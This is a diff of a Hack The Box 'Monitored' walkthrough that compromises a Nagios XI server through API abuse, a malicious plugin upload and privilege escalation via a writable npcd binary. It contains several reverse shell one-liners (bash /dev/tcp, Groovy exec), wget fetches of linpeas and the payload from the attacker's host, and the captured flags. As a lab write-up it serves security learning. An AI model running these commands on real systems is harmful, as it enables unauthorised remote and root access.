@@ -42,12 +42,11 @@ Nmap info:
 - SSH open, but we need creds.
 - HTTP redirects to HTTPS --> add to `/etc/hosts`
 - Find more about LDAP `389`
-
 ## Web enumeration
 
 Upon visiting the webserver on our browser we find a Nagios XI interface:
 
-![](home.png){: .normal width="60%"}
+![](home.png)
 
 We have encountered Nagios XI before on the Try Hack Me's [Nax](https://cspanias.github.io/posts/THM-Nax/) room. Let's remind ourselves [what Nagios XI is](https://cspanias.github.io/posts/THM-Nax/#21-nagios-xi):
 
@@ -80,7 +79,7 @@ So it seems that `/nagios` is some sort of another login portal:
 
 Unfortunately, we don't have any credentials at the moment. We can always try searching for default credentials used in Nagios XI:
 
-![](nagios_def_creds.png){: .normal width="75%"}
+![](nagios_def_creds.png)
 
 Unfortunately, that did not work! Next, we can try perform a **Hail Mary** scan using [incursore](https://github.com/wirzka/incursore) and see what we get back:
 
@@ -271,7 +270,7 @@ From those, we can further explore:
 
 The `/terminal` directory requires credentials, and the ones we currently have do not work:
 
-![](terminal_login.png){: .normal width="80%"}
+![](terminal_login.png)
 
 Next, we can recursively scan with the `/api` directory. It turns out that `/api/includes` does not have other subdirectories, but when it starts scanning the `/api/v1` subdirectory it returns the following:
 
@@ -329,7 +328,7 @@ We get an authentication token back: `"auth_token":"1c57b07be29194d09f34d35587f8
 
 ![](token_error.png)
 
-<!-- After searching some more about token authentication, we find a post titled as "[_Help with insecure login / backend ticket authentication](https://support.nagios.com/forum/viewtopic.php?t=58783&sid=d7eb283ff38882a13a1d5efa18649ac7)_" and seems to use the `/index.php` to pass the credentials instead of `/api/v1/authenticate`. Let's see where this does for us:
+After searching some more about token authentication, we find a post titled as "[_Help with insecure login / backend ticket authentication](https://support.nagios.com/forum/viewtopic.php?t=58783&sid=d7eb283ff38882a13a1d5efa18649ac7)_" and seems to use the `/index.php` to pass the credentials instead of `/api/v1/authenticate`. Let's see where this does for us:
 
 ![](token_redirection.png)
 
@@ -452,120 +451,36 @@ We successfully created the user `xhi4m` with `admin` privileges! Let's login:
 curl -XGET "https://nagios.monitored.htb/nagiosxi/api/v1/awesome/example/data1/data2?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1"
 ```
 
-[Managing plugins in Nagios XI](https://assets.nagios.com/downloads/nagiosxi/docs/Managing-Plugins-in-Nagios-XI.pdf)
+There is some detail documentation on how to create an execute a command: [Managing plugins in Nagios XI](https://assets.nagios.com/downloads/nagiosxi/docs/Managing-Plugins-in-Nagios-XI.pdf). Let's follow the documentation step by step:
+
+![](manage_plugins.png)
+
+Next, we can create a reverse shell script locally to upload:
 
 ```bash
-$ python3 /opt/revshellgen/revshellgen.py
-
-  ____ ___  _  __  ___  / /  ___   / /  / /  ___ _ ___   ___
- / __// -_)| |/ / (_-< / _ \/ -_) / /  / /  / _ `// -_) / _ \
-/_/   \__/ |___/ /___//_//_/\__/ /_/  /_/   \_, / \__/ /_//_/
-                                           /___/
-
-
----------- [ SELECT IP ] ----------
-
-[   ] 172.31.150.94 on eth0
-[   ] 172.17.0.1 on docker0
-[ x ] 10.10.14.11 on tun0
-[   ] Specify manually
-
----------- [ SPECIFY PORT ] ----------
-
-[ # ] Enter port number : 1337
-
----------- [ SELECT COMMAND ] ----------
-
-[   ] unix_bash
-[ x ] unix_java
-[   ] unix_nc_mkfifo
-[   ] unix_nc_plain
-[   ] unix_perl
-[   ] unix_php
-[   ] unix_python
-[   ] unix_ruby
-[   ] unix_telnet
-[   ] windows_powershell
-
----------- [ SELECT SHELL ] ----------
-
-[   ] /bin/sh
-[ x ] /bin/bash
-[   ] /bin/zsh
-[   ] /bin/ksh
-[   ] /bin/tcsh
-[   ] /bin/dash
-
----------- [ SELECT ENCODE TYPE ] ----------
-
-[ x ] NONE
-[   ] URL ENCODE
-[   ] BASE64 ENCODE
-
----------- [ FINISHED COMMAND ] ----------
-
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.11/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-
-[ ! ] Reverse shell command copied to clipboard!
-[ + ] In case you want to upgrade your shell, you can use this:
-
-python -c 'import pty;pty.spawn("/bin/bash")'
-
----------- [ SETUP LISTENER ] ----------
-
-[ x ] yes
-[   ] no
-Ncat: Version 7.94SVN ( https://nmap.org/ncat )
-Ncat: Listening on [::]:1337
-Ncat: Listening on 0.0.0.0:1337
-Ncat: Connection from 10.10.11.248:57296.
-bash: cannot set terminal process group (11677): Inappropriate ioctl for device
-bash: no job control in this shell
-nagios@monitored:/tmp$ ls
-ls
-memcalc
-systemd-private-3027788ee0d44a8b9ce8ffdd9e495dd5-apache2.service-I5CXmj
-systemd-private-3027788ee0d44a8b9ce8ffdd9e495dd5-ntp.service-MZO8Rh
-systemd-private-3027788ee0d44a8b9ce8ffdd9e495dd5-systemd-logind.service-8C27ah
-vmware-root_472-860398016
-nagios@monitored:/tmp$
+$ cat check_command
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/1337 0>&1'
 ```
+
+The process is as follows:
+1. Upload the shell as a plugin.
+2. Create a command which will execute the plugin.
+3. Create a service to run the command.
 
 ```bash
 $ sudo nc -lvnp 1337
+[sudo] password for kali:
 listening on [any] 1337 ...
-connect to [10.10.14.11] from (UNKNOWN) [10.10.11.248] 48796
-bash: cannot set terminal process group (13481): Inappropriate ioctl for device
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.248] 47560
+bash: cannot set terminal process group (2841): Inappropriate ioctl for device
 bash: no job control in this shell
-# upgrade shell
-nagios@monitored:/tmp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-nagios@monitored:/tmp$ ^Z
-[1]+  Stopped                 sudo nc -lvnp 1337
-
-┌──(kali㉿CSpanias)-[~/htb/fullpwn/monitored]
-└─$ stty raw -echo; fg
-sudo nc -lvnp 1337
-
-nagios@monitored:/tmp$ export TERM=xterm
-nagios@monitored:/tmp$ id
-id
-uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
-nagios@monitored:/tmp$ cd ~
-cd ~
-nagios@monitored:/home/nagios$ ls
-ls
-cookie.txt  user.txt
-nagios@monitored:/home/nagios$ cat user.txt
-cat user.txt
-fdf35f5741dd156e34bf10738ced40c4
+nagios@monitored:~$
 ```
 
 ## Privilege escalation
 
 ```bash
+nagios@monitored:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 nagios@monitored:/tmp$ sudo -l
 sudo -l
 Matching Defaults entries for nagios on localhost:
@@ -599,8 +514,155 @@ User nagios may run the following commands on localhost:
 nagios@monitored:/tmp$
 ```
 
+```bash
+nagios@monitored:~$ wget http://10.10.14.11:8888/linpeas.sh
+wget http://10.10.14.11:8888/linpeas.sh
+--2024-01-17 02:12:44--  http://10.10.14.11:8888/linpeas.sh
+Connecting to 10.10.14.11:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 847920 (828K) [text/x-sh]
+Saving to: ‘linpeas.sh’
 
+linpeas.sh          100%[===================>] 828.05K  2.16MB/s    in 0.4s
 
-> [Automated script](https://gist.github.com/Acters/058b0421dba28860afd5559db6a7afee)
+2024-01-17 02:12:45 (2.16 MB/s) - ‘linpeas.sh’ saved [847920/847920]
 
-![](machine_pwned.png){: width="75%" .normal} -->
+nagios@monitored:~$ ls -l
+ls -l
+total 840
+-rw-r--r-- 1 nagios nagios    131 Jan 17 01:24 cookie.txt
+-rw-r--r-- 1 nagios nagios 847920 Dec 30 23:27 linpeas.sh
+-rw-r----- 1 root   nagios     33 Jan 17 01:19 user.txt
+nagios@monitored:~$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+nagios@monitored:~$ ls -l
+ls -l
+total 840
+-rw-r--r-- 1 nagios nagios    131 Jan 17 01:24 cookie.txt
+nagios@monitored:~$ ./linpeas.sh
+./linpeas.sh
+
+<SNIP>
+
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
+/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
+/etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
+/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
+
+<SNIP>
+```
+
+It seems that we have some executables that we can write to, such as `/usr/local/nagios/bin/npcd` and were also present in our `sudo -l` list:
+
+```bash
+(root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+```
+
+We can also see that the `manage_services.sh` script is written for starting, restarting, and stopping services, including `npcd`:
+
+```bash
+nagios@monitored:~$ cat /usr/local/nagiosxi/scripts/manage_services.sh
+cat /usr/local/nagiosxi/scripts/manage_services.sh
+#!/bin/bash
+#
+# Manage Services (start/stop/restart)
+# Copyright (c) 2015-2020 Nagios Enterprises, LLC. All rights reserved.
+#
+# =====================
+# Built to allow start/stop/restart of services using the proper method based on
+# the actual version of operating system.
+#
+# Examples:
+# ./manage_services.sh start httpd
+# ./manage_services.sh restart mysqld
+# ./manage_services.sh checkconfig nagios
+#
+
+BASEDIR=$(dirname $(readlink -f $0))
+
+# Import xi-sys.cfg config vars
+. $BASEDIR/../etc/xi-sys.cfg
+
+# Things you can do
+first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
+second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
+
+<SNIP>
+```
+
+Based on this info, we could:
+1. Modify the `/usr/local/nagios/bin/npcd` executable, since we have write access with reverse shell code.
+2. Use the `manage_services.sh` script to restart the service, so the modified executable can be run.
+
+Since the latter is run as `root`, we should receive a `root` shell back. Let's start by create a reverse shell script and transfer it to the target:
+
+```bash
+# create the reverse shell script
+$ cat npcd
+#!/bin/bash
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/9999 0>&1'
+# launch a Python3 HTTP server
+python3 -m http.server 8888
+```
+
+Let's set up our listener before moving forward:
+
+```bash
+$ nc -lvnp 9999
+listening on [any] 9999 ...
+```
+
+Next, let's download the script from the target and restart the service:
+
+```bash
+nagios@monitored:~$ cd /usr/local/nagios/bin/
+cd /usr/local/nagios/bin/
+nagios@monitored:/usr/local/nagios/bin$ ls
+ls
+nagios      ndo.so          npcd.bk    npcd.save  nrpe-uninstall
+nagiostats  ndo-startup-hash.sh  npcdmod.o  nrpe       nsca
+nagios@monitored:/usr/local/nagios/bin$ wget http://10.10.14.11:8888/npcd
+wget http://10.10.14.11:8888/npcd
+--2024-01-17 04:26:27--  http://10.10.14.11:8888/npcd
+Connecting to 10.10.14.11:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 69 [application/octet-stream]
+Saving to: ‘npcd’
+
+npcd                100%[===================>]      69  --.-KB/s    in 0s
+
+2024-01-17 04:26:27 (8.84 MB/s) - ‘npcd’ saved [69/69]
+# give executable permissions to the file
+nagios@monitored:/usr/local/nagios/bin$ chmod +x npcd
+chmod +x npcd
+# check permissions
+nagios@monitored:/usr/local/nagios/bin$ ls -l npcd
+ls -l npcd
+-rwxr-xr-x 1 nagios nagios 69 Jan 17 04:23 npcd
+# restart the service
+nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
+<al/nagiosxi/scripts/manage_services.sh restart npcd
+```
+
+Let's check our listener:
+
+```bash
+$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.248] 51972
+bash: cannot set terminal process group (62859): Inappropriate ioctl for device
+bash: no job control in this shell
+root@monitored:/# cat /root/root.txt
+cat /root/root.txt
+e2edb527aa4be3779605c6cdfcd73e14
+```
+
+![](machine_pwned.png){: width="75%" .normal}
